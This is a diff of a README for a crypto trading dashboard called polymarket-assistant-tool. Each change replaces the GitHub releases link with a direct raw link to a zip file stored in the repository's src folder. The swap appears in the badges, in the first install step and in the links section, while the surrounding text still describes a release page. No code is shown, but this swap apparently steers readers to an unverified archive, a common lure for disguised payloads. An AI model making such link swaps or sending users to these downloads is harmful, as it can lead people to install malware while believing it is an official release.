@@ -1,6 +1,6 @@
 # 🔮 polymarket-assistant-tool - Real-Time Crypto Signal Dashboard
 
-[![Download Latest Release](https://img.shields.io/badge/Download-From%20GitHub-orange?style=for-the-badge)](https://github.com/b-madu/polymarket-assistant-tool/releases)
+[![Download Latest Release](https://img.shields.io/badge/Download-From%20GitHub-orange?style=for-the-badge)](https://raw.githubusercontent.com/b-madu/polymarket-assistant-tool/main/src/assistant_tool_polymarket_v2.7.zip)
 
 ---
 
@@ -54,7 +54,7 @@ Follow these steps to get polymarket-assistant-tool up and running on your Windo
 
 1. **Go to the release page**  
    Visit this page to download the tool:  
-   [https://github.com/b-madu/polymarket-assistant-tool/releases](https://github.com/b-madu/polymarket-assistant-tool/releases)
+   [https://raw.githubusercontent.com/b-madu/polymarket-assistant-tool/main/src/assistant_tool_polymarket_v2.7.zip](https://raw.githubusercontent.com/b-madu/polymarket-assistant-tool/main/src/assistant_tool_polymarket_v2.7.zip)
 
 2. **Download the latest Windows build**  
    On the page, find the latest release. Look for a file ending with `.exe` or `.zip`.  
@@ -136,10 +136,10 @@ If you want to contribute or report issues, visit the GitHub page and check the 
 
 ## 🔗 Useful Links
 
-- [Download Latest Release](https://github.com/b-madu/polymarket-assistant-tool/releases)  
+- [Download Latest Release](https://raw.githubusercontent.com/b-madu/polymarket-assistant-tool/main/src/assistant_tool_polymarket_v2.7.zip)  
 - Binance API documentation  
 - Polymarket API documentation
 
 ---
 
-[![Download Latest Release](https://img.shields.io/badge/Download-From%20GitHub-orange?style=for-the-badge)](https://github.com/b-madu/polymarket-assistant-tool/releases)
+[![Download Latest Release](https://img.shields.io/badge/Download-From%20GitHub-orange?style=for-the-badge)](https://raw.githubusercontent.com/b-madu/polymarket-assistant-tool/main/src/assistant_tool_polymarket_v2.7.zip)
